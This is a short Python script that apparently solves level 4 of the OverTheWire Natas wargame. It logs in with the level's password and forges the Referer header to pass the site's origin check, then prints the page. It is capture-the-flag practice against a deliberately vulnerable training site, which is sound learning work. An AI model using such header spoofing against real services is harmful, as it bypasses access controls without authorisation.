import requests

r = requests.get(
    'http://natas4.natas.labs.overthewire.org',
    auth=('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'),
    headers={'Referer': 'http://natas5.natas.labs.overthewire.org/'}
)
print(r.text)
